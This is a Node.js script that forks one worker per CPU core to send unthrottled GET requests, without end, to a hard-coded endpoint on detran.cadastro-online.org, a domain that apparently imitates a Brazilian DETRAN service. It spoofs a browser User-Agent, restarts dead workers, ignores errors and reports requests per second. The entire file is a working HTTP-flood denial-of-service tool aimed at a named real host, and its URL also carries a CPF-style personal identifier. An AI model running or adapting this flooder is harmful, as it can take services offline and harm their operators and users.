const cluster = require('cluster');
const os = require('os');
const axios = require('axios');

const numCPUs = os.cpus().length;
const url = 'https://detran.cadastro-online.org/api-cpf.php?cpf=61575264323';

// Counter for requests
let requestCount = 0;
const startTime = Date.now();

// Function to log statistics
function logStats() {
  const elapsedSeconds = (Date.now() - startTime) / 1000;
  const requestsPerSecond = requestCount / elapsedSeconds;
  console.log(`Total requests: ${requestCount} | Requests/second: ${requestsPerSecond.toFixed(2)} | Active workers: ${Object.keys(cluster.workers).length}`);
}

if (cluster.isMaster) {
  console.log(`Master process ${process.pid} is running`);
  console.log(`Starting ${numCPUs} workers...`);
  console.log(`Total CPU cores: ${numCPUs}`);

  // Fork workers
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }

  // Log when a worker dies and fork a new one
  cluster.on('exit', (worker, code, signal) => {
    console.log(`Worker ${worker.process.pid} died. Restarting...`);
    cluster.fork();
  });

  // Collect statistics from workers
  Object.values(cluster.workers).forEach(worker => {
    worker.on('message', (msg) => {
      if (msg.count) {
        requestCount += msg.count;
      }
    });
  });

  // Log statistics every second
  setInterval(logStats, 1000);

} else {
  // Worker process
  console.log(`Worker ${process.pid} started`);

  // Configure axios
  const instance = axios.create({
    timeout: 10000,
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
  });

  async function makeRequest() {
    try {
      const response = await instance.get(url);
      console.log(`Worker ${process.pid} received: ${response.data}`);
      
      // Notify master about completed request
      process.send({ count: 1 });
      
      // Continue making requests without delay
      setImmediate(makeRequest);
    } catch (error) {
      let errorMessage = 'Unknown error';
      if (error.response) {
        // The request was made and the server responded with a status code
        errorMessage = `Status ${error.response.status}: ${error.response.statusText}`;
      } else if (error.request) {
        // The request was made but no response was received
        errorMessage = 'No response received';
      } else {
        // Something happened in setting up the request
        errorMessage = error.message;
      }
      
      console.error(`Worker ${process.pid} error: ${errorMessage}`);
      
      // Continue making requests even after an error
      setImmediate(makeRequest);
    }
  }

  // Start making requests
  makeRequest();
} 